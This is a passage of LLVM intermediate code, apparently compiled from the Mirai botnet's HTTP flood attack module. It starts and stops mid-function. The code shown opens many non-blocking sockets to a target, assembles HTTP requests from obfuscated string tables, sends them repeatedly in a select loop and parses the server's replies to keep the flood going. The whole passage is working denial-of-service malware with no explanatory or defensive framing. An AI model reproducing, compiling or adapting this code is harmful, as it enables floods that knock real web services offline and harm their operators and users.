  tail call void @llvm.memmove.p0i8.p0i8.i64(i8* %85, i8* %80, i64 %87, i32 1, i1 false)
  store i8 47, i8* %80, align 4
  br label %88

; <label>:88:                                     ; preds = %71, %84
  %89 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv661, i32 10, i64 0
  %90 = tail call i32 @util_strcpy(i8* %89, i8* %15) #10
  %91 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv661, i32 9, i64 0
  %92 = tail call i32 @util_strcpy(i8* %91, i8* %15) #10
  %93 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv661, i32 7, i64 0
  %94 = tail call i32 @util_strcpy(i8* %93, i8* %16) #10
  %95 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %76, i32 2
  %96 = load i8, i8* %95, align 4
  %97 = icmp ult i8 %96, 32
  br i1 %97, label %98, label %102

; <label>:98:                                     ; preds = %88
  %99 = load i32, i32* %77, align 4
  %100 = tail call i32 @ntohl(i32 %99) #11
  %101 = tail call i32 @htonl(i32 %100) #11
  store i32 %101, i32* %79, align 4
  br label %102

; <label>:102:                                    ; preds = %98, %88
  tail call void @table_unlock_val(i8 zeroext 54)
  %103 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv661, i32 5, i64 0
  %104 = tail call i8* @table_retrieve_val(i32 54, i32* null)
  %105 = tail call i32 @util_strcpy(i8* %103, i8* %104) #10
  tail call void @table_lock_val(i8 zeroext 54)
  %106 = tail call i32 @util_strcpy(i8* %80, i8* %17) #10
  %indvars.iv.next662 = add nuw nsw i64 %indvars.iv661, 1
  %107 = icmp slt i64 %indvars.iv.next662, %53
  br i1 %107, label %71, label %.preheader595.loopexit

.backedge596.loopexit:                            ; preds = %.loopexit591
  br label %.backedge596.backedge

.backedge596:                                     ; preds = %.backedge596.backedge, %.preheader595
  %108 = call i64 @time(i64* null) #10
  %109 = trunc i64 %108 to i32
  %110 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %54) #10, !srcloc !1
  %111 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %55) #10, !srcloc !2
  br i1 %56, label %.lr.ph615.preheader, label %.backedge596.backedge

.lr.ph615.preheader:                              ; preds = %.backedge596
  br label %.lr.ph615

.lr.ph615:                                        ; preds = %.lr.ph615.preheader, %386
  %indvars.iv = phi i64 [ %indvars.iv.next, %386 ], [ 0, %.lr.ph615.preheader ]
  %.0530612 = phi i32 [ %.1531, %386 ], [ 0, %.lr.ph615.preheader ]
  %112 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv
  %113 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 1
  %114 = load i8, i8* %113, align 4
  %115 = icmp eq i8 %114, 1
  br i1 %115, label %116, label %120

; <label>:116:                                    ; preds = %.lr.ph615
  %117 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 12
  %118 = load i32, i32* %117, align 4
  %119 = icmp ne i32 %118, 0
  %.sink = select i1 %119, i8 4, i8 0
  store i8 %.sink, i8* %113, align 4
  br label %120

; <label>:120:                                    ; preds = %116, %.lr.ph615
  %121 = phi i8 [ %.sink, %116 ], [ %114, %.lr.ph615 ]
  switch i8 %121, label %382 [
    i8 0, label %122
    i8 2, label %155
    i8 4, label %178
    i8 6, label %340
    i8 7, label %354
    i8 10, label %368
  ]

; <label>:122:                                    ; preds = %120
  call void @llvm.memset.p0i8.i64(i8* nonnull %61, i8 0, i64 16, i32 4, i1 false)
  %123 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %112, i64 0, i32 0
  %124 = load i32, i32* %123, align 4
  %125 = icmp eq i32 %124, -1
  br i1 %125, label %128, label %126

; <label>:126:                                    ; preds = %122
  %127 = call i32 @close(i32 %124) #10
  br label %128

; <label>:128:                                    ; preds = %122, %126
  %129 = call i32 @socket(i32 2, i32 1, i32 0) #10
  store i32 %129, i32* %123, align 4
  %130 = icmp eq i32 %129, -1
  br i1 %130, label %386, label %131

; <label>:131:                                    ; preds = %128
  %132 = call i32 (i32, i32, ...) @fcntl(i32 %129, i32 3, i32 0) #10
  %133 = or i32 %132, 2048
  %134 = call i32 (i32, i32, ...) @fcntl(i32 %129, i32 4, i32 %133) #10
  store i32 65535, i32* %5, align 4
  %135 = load i32, i32* %123, align 4
  %136 = call i32 @setsockopt(i32 %135, i32 0, i32 8, i8* nonnull %62, i32 4) #10
  store i16 2, i16* %63, align 4
  %137 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 4
  %138 = load i32, i32* %137, align 4
  store i32 %138, i32* %64, align 4
  %139 = call zeroext i16 @htons(i16 zeroext %20) #11
  store i16 %139, i16* %65, align 2
  %140 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 2
  store i32 %109, i32* %140, align 4
  store i8 2, i8* %113, align 4
  %141 = load i32, i32* %123, align 4
  %142 = call i32 @connect(i32 %141, %struct.sockaddr* nonnull %66, i32 16) #10
  %143 = load i32, i32* %123, align 4
  %144 = srem i32 %143, 64
  %145 = zext i32 %144 to i64
  %146 = shl i64 1, %145
  %147 = sdiv i32 %143, 64
  %148 = sext i32 %147 to i64
  %149 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i64 0, i32 0, i64 %148
  %150 = load i64, i64* %149, align 8
  %151 = or i64 %146, %150
  store i64 %151, i64* %149, align 8
  %152 = load i32, i32* %123, align 4
  %153 = icmp sgt i32 %152, %.0530612
  %154 = add nsw i32 %152, 1
  %..0530 = select i1 %153, i32 %154, i32 %.0530612
  br label %386

; <label>:155:                                    ; preds = %120
  %156 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 2
  %157 = load i32, i32* %156, align 4
  %158 = sub i32 %109, %157
  %159 = icmp ugt i32 %158, 30
  br i1 %159, label %160, label %164

; <label>:160:                                    ; preds = %155
  store i8 0, i8* %113, align 4
  %161 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %112, i64 0, i32 0
  %162 = load i32, i32* %161, align 4
  %163 = call i32 @close(i32 %162) #10
  store i32 -1, i32* %161, align 4
  br label %386

; <label>:164:                                    ; preds = %155
  %165 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %112, i64 0, i32 0
  %166 = load i32, i32* %165, align 4
  %167 = srem i32 %166, 64
  %168 = zext i32 %167 to i64
  %169 = shl i64 1, %168
  %170 = sdiv i32 %166, 64
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i64 0, i32 0, i64 %171
  %173 = load i64, i64* %172, align 8
  %174 = or i64 %169, %173
  store i64 %174, i64* %172, align 8
  %175 = load i32, i32* %165, align 4
  %176 = icmp sgt i32 %175, %.0530612
  %177 = add nsw i32 %175, 1
  %..0530550 = select i1 %176, i32 %177, i32 %.0530612
  br label %386

; <label>:178:                                    ; preds = %120
  %179 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 14
  store i32 -1, i32* %179, align 4
  %180 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 11
  store i32 0, i32* %180, align 4
  %181 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 18, i64 0
  call void @util_zero(i8* %181, i32 1024) #10
  %182 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 17
  store i32 0, i32* %182, align 4
  call void @util_zero(i8* nonnull %67, i32 10240) #10
  %183 = call i32 @util_strlen(i8* nonnull %67) #10
  %184 = sext i32 %183 to i64
  %185 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %184
  %186 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 9, i64 0
  %187 = call i32 @util_strcpy(i8* %185, i8* %186) #10
  %188 = call i32 @util_strlen(i8* nonnull %67) #10
  %189 = sext i32 %188 to i64
  %190 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %189
  %191 = call i32 @util_strcpy(i8* %190, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0)) #10
  %192 = call i32 @util_strlen(i8* nonnull %67) #10
  %193 = sext i32 %192 to i64
  %194 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %193
  %195 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 6, i64 0
  %196 = call i32 @util_strcpy(i8* %194, i8* %195) #10
  %197 = call i32 @util_strlen(i8* nonnull %67) #10
  %198 = sext i32 %197 to i64
  %199 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %198
  %200 = call i32 @util_strcpy(i8* %199, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i64 0, i64 0)) #10
  %201 = call i32 @util_strlen(i8* nonnull %67) #10
  %202 = sext i32 %201 to i64
  %203 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %202
  %204 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 5, i64 0
  %205 = call i32 @util_strcpy(i8* %203, i8* %204) #10
  %206 = call i32 @util_strlen(i8* nonnull %67) #10
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %207
  %209 = call i32 @util_strcpy(i8* %208, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0)) #10
  %210 = call i32 @util_strlen(i8* nonnull %67) #10
  %211 = sext i32 %210 to i64
  %212 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %211
  %213 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 7, i64 0
  %214 = call i32 @util_strcpy(i8* %212, i8* %213) #10
  %215 = call i32 @util_strlen(i8* nonnull %67) #10
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %216
  %218 = call i32 @util_strcpy(i8* %217, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0)) #10
  call void @table_unlock_val(i8 zeroext 39)
  %219 = call i32 @util_strlen(i8* nonnull %67) #10
  %220 = sext i32 %219 to i64
  %221 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %220
  %222 = call i8* @table_retrieve_val(i32 39, i32* null)
  %223 = call i32 @util_strcpy(i8* %221, i8* %222) #10
  call void @table_lock_val(i8 zeroext 39)
  %224 = call i32 @util_strlen(i8* nonnull %67) #10
  %225 = sext i32 %224 to i64
  %226 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %225
  %227 = call i32 @util_strcpy(i8* %226, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0)) #10
  call void @table_unlock_val(i8 zeroext 40)
  %228 = call i32 @util_strlen(i8* nonnull %67) #10
  %229 = sext i32 %228 to i64
  %230 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %229
  %231 = call i8* @table_retrieve_val(i32 40, i32* null)
  %232 = call i32 @util_strcpy(i8* %230, i8* %231) #10
  call void @table_lock_val(i8 zeroext 40)
  %233 = call i32 @util_strlen(i8* nonnull %67) #10
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %234
  %236 = call i32 @util_strcpy(i8* %235, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0)) #10
  call void @table_unlock_val(i8 zeroext 41)
  %237 = call i32 @util_strlen(i8* nonnull %67) #10
  %238 = sext i32 %237 to i64
  %239 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %238
  %240 = call i8* @table_retrieve_val(i32 41, i32* null)
  %241 = call i32 @util_strcpy(i8* %239, i8* %240) #10
  call void @table_lock_val(i8 zeroext 41)
  %242 = call i32 @util_strlen(i8* nonnull %67) #10
  %243 = sext i32 %242 to i64
  %244 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %243
  %245 = call i32 @util_strcpy(i8* %244, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0)) #10
  br i1 %68, label %246, label %274

; <label>:246:                                    ; preds = %178
  call void @table_unlock_val(i8 zeroext 42)
  %247 = call i32 @util_strlen(i8* nonnull %67) #10
  %248 = sext i32 %247 to i64
  %249 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %248
  %250 = call i8* @table_retrieve_val(i32 42, i32* null)
  %251 = call i32 @util_strcpy(i8* %249, i8* %250) #10
  call void @table_lock_val(i8 zeroext 42)
  %252 = call i32 @util_strlen(i8* nonnull %67) #10
  %253 = sext i32 %252 to i64
  %254 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %253
  %255 = call i32 @util_strcpy(i8* %254, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0)) #10
  %256 = call i32 @util_strlen(i8* nonnull %67) #10
  %257 = sext i32 %256 to i64
  %258 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %257
  %259 = call i8* @table_retrieve_val(i32 47, i32* null)
  %260 = call i32 @util_strcpy(i8* %258, i8* %259) #10
  %261 = call i32 @util_strlen(i8* nonnull %67) #10
  %262 = sext i32 %261 to i64
  %263 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %262
  %264 = call i32 @util_strcpy(i8* %263, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0)) #10
  %265 = call i32 @util_strlen(i8* nonnull %14) #10
  %266 = call i32 @util_strlen(i8* nonnull %67) #10
  %267 = sext i32 %266 to i64
  %268 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %267
  %269 = call i8* @util_itoa(i32 %265, i32 10, i8* %268) #10
  %270 = call i32 @util_strlen(i8* nonnull %67) #10
  %271 = sext i32 %270 to i64
  %272 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %271
  %273 = call i32 @util_strcpy(i8* %272, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0)) #10
  br label %274

; <label>:274:                                    ; preds = %246, %178
  %275 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 15
  %276 = load i32, i32* %275, align 4
  %277 = icmp sgt i32 %276, 0
  br i1 %277, label %278, label %305

; <label>:278:                                    ; preds = %274
  %279 = call i32 @util_strlen(i8* nonnull %67) #10
  %280 = sext i32 %279 to i64
  %281 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %280
  %282 = call i32 @util_strcpy(i8* %281, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i64 0, i64 0)) #10
  store i32 0, i32* %5, align 4
  %283 = load i32, i32* %275, align 4
  %284 = icmp sgt i32 %283, 0
  %285 = call i32 @util_strlen(i8* nonnull %67) #10
  %286 = sext i32 %285 to i64
  %287 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %286
  br i1 %284, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %278
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %288 = phi i8* [ %303, %.lr.ph ], [ %287, %.lr.ph.preheader ]
  %289 = load i32, i32* %5, align 4
  %290 = sext i32 %289 to i64
  %291 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 16, i64 %290, i64 0
  %292 = call i32 @util_strcpy(i8* %288, i8* %291) #10
  %293 = call i32 @util_strlen(i8* nonnull %67) #10
  %294 = sext i32 %293 to i64
  %295 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %294
  %296 = call i32 @util_strcpy(i8* %295, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i64 0, i64 0)) #10
  %297 = load i32, i32* %5, align 4
  %298 = add nsw i32 %297, 1
  store i32 %298, i32* %5, align 4
  %299 = load i32, i32* %275, align 4
  %300 = icmp slt i32 %298, %299
  %301 = call i32 @util_strlen(i8* nonnull %67) #10
  %302 = sext i32 %301 to i64
  %303 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %302
  br i1 %300, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %278
  %.lcssa = phi i8* [ %287, %278 ], [ %303, %._crit_edge.loopexit ]
  %304 = call i32 @util_strcpy(i8* %.lcssa, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0)) #10
  br label %305

; <label>:305:                                    ; preds = %._crit_edge, %274
  %306 = call i32 @util_strlen(i8* nonnull %67) #10
  %307 = sext i32 %306 to i64
  %308 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %307
  %309 = call i32 @util_strcpy(i8* %308, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0)) #10
  br i1 %68, label %310, label %315

; <label>:310:                                    ; preds = %305
  %311 = call i32 @util_strlen(i8* nonnull %67) #10
  %312 = sext i32 %311 to i64
  %313 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %312
  %314 = call i32 @util_strcpy(i8* %313, i8* nonnull %14) #10
  br label %315

; <label>:315:                                    ; preds = %310, %305
  %316 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 10, i64 0
  %317 = call signext i8 @util_strcmp(i8* nonnull %186, i8* %316) #10
  %318 = icmp eq i8 %317, 0
  br i1 %318, label %319, label %321

; <label>:319:                                    ; preds = %315
  %320 = call i32 @util_strcpy(i8* nonnull %186, i8* %316) #10
  br label %321

; <label>:321:                                    ; preds = %315, %319
  %322 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %112, i64 0, i32 0
  %323 = load i32, i32* %322, align 4
  %324 = call i32 @util_strlen(i8* nonnull %67) #10
  %325 = sext i32 %324 to i64
  %326 = call i64 @send(i32 %323, i8* nonnull %67, i64 %325, i32 16384) #10
  %327 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 3
  store i32 %109, i32* %327, align 4
  store i8 6, i8* %113, align 4
  %328 = load i32, i32* %322, align 4
  %329 = srem i32 %328, 64
  %330 = zext i32 %329 to i64
  %331 = shl i64 1, %330
  %332 = sdiv i32 %328, 64
  %333 = sext i32 %332 to i64
  %334 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 %333
  %335 = load i64, i64* %334, align 8
  %336 = or i64 %331, %335
  store i64 %336, i64* %334, align 8
  %337 = load i32, i32* %322, align 4
  %338 = icmp sgt i32 %337, %.0530612
  %339 = add nsw i32 %337, 1
  %..0530551 = select i1 %338, i32 %339, i32 %.0530612
  br label %386

; <label>:340:                                    ; preds = %120
  %341 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %112, i64 0, i32 0
  %342 = load i32, i32* %341, align 4
  %343 = srem i32 %342, 64
  %344 = zext i32 %343 to i64
  %345 = shl i64 1, %344
  %346 = sdiv i32 %342, 64
  %347 = sext i32 %346 to i64
  %348 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 %347
  %349 = load i64, i64* %348, align 8
  %350 = or i64 %345, %349
  store i64 %350, i64* %348, align 8
  %351 = load i32, i32* %341, align 4
  %352 = icmp sgt i32 %351, %.0530612
  %353 = add nsw i32 %351, 1
  %..0530552 = select i1 %352, i32 %353, i32 %.0530612
  br label %386

; <label>:354:                                    ; preds = %120
  %355 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %112, i64 0, i32 0
  %356 = load i32, i32* %355, align 4
  %357 = srem i32 %356, 64
  %358 = zext i32 %357 to i64
  %359 = shl i64 1, %358
  %360 = sdiv i32 %356, 64
  %361 = sext i32 %360 to i64
  %362 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 %361
  %363 = load i64, i64* %362, align 8
  %364 = or i64 %359, %363
  store i64 %364, i64* %362, align 8
  %365 = load i32, i32* %355, align 4
  %366 = icmp sgt i32 %365, %.0530612
  %367 = add nsw i32 %365, 1
  %..0530553 = select i1 %366, i32 %367, i32 %.0530612
  br label %386

; <label>:368:                                    ; preds = %120
  %369 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %112, i64 0, i32 0
  %370 = load i32, i32* %369, align 4
  %371 = srem i32 %370, 64
  %372 = zext i32 %371 to i64
  %373 = shl i64 1, %372
  %374 = sdiv i32 %370, 64
  %375 = sext i32 %374 to i64
  %376 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 %375
  %377 = load i64, i64* %376, align 8
  %378 = or i64 %373, %377
  store i64 %378, i64* %376, align 8
  %379 = load i32, i32* %369, align 4
  %380 = icmp sgt i32 %379, %.0530612
  %381 = add nsw i32 %379, 1
  %..0530554 = select i1 %380, i32 %381, i32 %.0530612
  br label %386

; <label>:382:                                    ; preds = %120
  store i8 0, i8* %113, align 4
  %383 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %112, i64 0, i32 0
  %384 = load i32, i32* %383, align 4
  %385 = call i32 @close(i32 %384) #10
  store i32 -1, i32* %383, align 4
  br label %386

; <label>:386:                                    ; preds = %368, %354, %340, %321, %164, %131, %382, %128, %160
  %.1531 = phi i32 [ %.0530612, %128 ], [ %.0530612, %160 ], [ %.0530612, %382 ], [ %..0530, %131 ], [ %..0530550, %164 ], [ %..0530551, %321 ], [ %..0530552, %340 ], [ %..0530553, %354 ], [ %..0530554, %368 ]
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %387 = icmp slt i64 %indvars.iv.next, %69
  br i1 %387, label %.lr.ph615, label %._crit_edge616

._crit_edge616:                                   ; preds = %386
  %388 = icmp eq i32 %.1531, 0
  br i1 %388, label %.backedge596.backedge, label %389

.backedge596.backedge:                            ; preds = %._crit_edge616, %389, %.backedge596, %.backedge596.loopexit
  br label %.backedge596

; <label>:389:                                    ; preds = %._crit_edge616
  store i64 0, i64* %57, align 8
  store i64 1, i64* %58, align 8
  %390 = call i32 @select(i32 %.1531, %struct.fd_set* nonnull %7, %struct.fd_set* nonnull %8, %struct.fd_set* null, %struct.timeval* nonnull %9) #10
  %391 = call i64 @time(i64* null) #10
  %392 = trunc i64 %391 to i32
  %393 = icmp slt i32 %390, 1
  %brmerge = or i1 %393, %.not
  br i1 %brmerge, label %.backedge596.backedge, label %.lr.ph633.preheader

.lr.ph633.preheader:                              ; preds = %389
  br label %.lr.ph633

.lr.ph633:                                        ; preds = %.lr.ph633.preheader, %.loopexit591
  %indvars.iv659 = phi i64 [ %indvars.iv.next660, %.loopexit591 ], [ 0, %.lr.ph633.preheader ]
  %394 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 0
  %395 = load i32, i32* %394, align 4
  %396 = icmp eq i32 %395, -1
  br i1 %396, label %.loopexit591, label %397

; <label>:397:                                    ; preds = %.lr.ph633
  %398 = sdiv i32 %395, 64
  %399 = sext i32 %398 to i64
  %400 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i64 0, i32 0, i64 %399
  %401 = load i64, i64* %400, align 8
  %402 = srem i32 %395, 64
  %403 = zext i32 %402 to i64
  %404 = shl i64 1, %403
  %405 = and i64 %401, %404
  %406 = icmp eq i64 %405, 0
  br i1 %406, label %419, label %407

; <label>:407:                                    ; preds = %397
  store i32 0, i32* %12, align 4
  store i32 4, i32* %13, align 4
  %408 = load i32, i32* %394, align 4
  %409 = call i32 @getsockopt(i32 %408, i32 1, i32 4, i8* nonnull %60, i32* nonnull %13) #10
  %410 = load i32, i32* %12, align 4
  %411 = or i32 %410, %409
  %412 = icmp eq i32 %411, 0
  br i1 %412, label %413, label %415

; <label>:413:                                    ; preds = %407
  %414 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 1
  store i8 4, i8* %414, align 4
  br label %419

; <label>:415:                                    ; preds = %407
  %416 = load i32, i32* %394, align 4
  %417 = call i32 @close(i32 %416) #10
  store i32 -1, i32* %394, align 4
  %418 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 1
  store i8 0, i8* %418, align 4
  br label %.loopexit591

; <label>:419:                                    ; preds = %397, %413
  %420 = load i32, i32* %394, align 4
  %421 = sdiv i32 %420, 64
  %422 = sext i32 %421 to i64
  %423 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 %422
  %424 = load i64, i64* %423, align 8
  %425 = srem i32 %420, 64
  %426 = zext i32 %425 to i64
  %427 = shl i64 1, %426
  %428 = and i64 %427, %424
  %429 = icmp eq i64 %428, 0
  br i1 %429, label %.loopexit591, label %430

; <label>:430:                                    ; preds = %419
  %431 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 1
  %432 = load i8, i8* %431, align 4
  switch i8 %432, label %.loopexit591 [
    i8 6, label %442
    i8 7, label %.preheader590
    i8 10, label %.preheader592.preheader
  ]

.preheader592.preheader:                          ; preds = %430
  br label %.preheader592

.preheader590:                                    ; preds = %430
  %433 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 17
  %434 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 18, i64 0
  %435 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 18, i64 64
  %436 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 18, i64 0
  %437 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 2
  %438 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 14
  %439 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 11
  %440 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 13
  %441 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 15
  br label %902

; <label>:442:                                    ; preds = %430
  call void @util_zero(i8* nonnull %21, i32 10240) #10
  %443 = load i32, i32* %394, align 4
  %444 = call i64 @recv(i32 %443, i8* nonnull %21, i64 10240, i32 16386) #10
  %445 = trunc i64 %444 to i32
  %446 = icmp slt i32 %445, 1
  br i1 %446, label %447, label %450

; <label>:447:                                    ; preds = %442
  %448 = load i32, i32* %394, align 4
  %449 = call i32 @close(i32 %448) #10
  store i32 -1, i32* %394, align 4
  store i8 0, i8* %431, align 4
  br label %.loopexit591

; <label>:450:                                    ; preds = %442
  %451 = call i32 @util_memsearch(i8* nonnull %21, i32 %445, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i64 0, i64 0), i32 4)
  %452 = icmp eq i32 %451, -1
  %453 = icmp slt i32 %445, 10240
  %or.cond5 = and i1 %453, %452
  br i1 %or.cond5, label %.loopexit591, label %454

; <label>:454:                                    ; preds = %450
  %455 = sext i32 %451 to i64
  %456 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %455
  store i8 0, i8* %456, align 1
  %457 = call i8* @table_retrieve_val(i32 53, i32* null)
  %458 = call i32 @util_stristr(i8* nonnull %21, i32 %445, i8* %457) #10
  %459 = icmp eq i32 %458, -1
  br i1 %459, label %462, label %460

; <label>:460:                                    ; preds = %454
  %461 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 11
  store i32 2, i32* %461, align 4
  br label %462

; <label>:462:                                    ; preds = %454, %460
  %463 = call i8* @table_retrieve_val(i32 52, i32* null)
  %464 = call i32 @util_stristr(i8* nonnull %21, i32 %445, i8* %463) #10
  %465 = icmp eq i32 %464, -1
  br i1 %465, label %468, label %466

; <label>:466:                                    ; preds = %462
  %467 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 11
  store i32 1, i32* %467, align 4
  br label %468

; <label>:468:                                    ; preds = %462, %466
  %469 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 12
  store i32 0, i32* %469, align 4
  %470 = call i8* @table_retrieve_val(i32 51, i32* null)
  %471 = call i32 @util_stristr(i8* nonnull %21, i32 %445, i8* %470) #10
  %472 = icmp eq i32 %471, -1
  br i1 %472, label %497, label %473

; <label>:473:                                    ; preds = %468
  %474 = call i8* @table_retrieve_val(i32 51, i32* null)
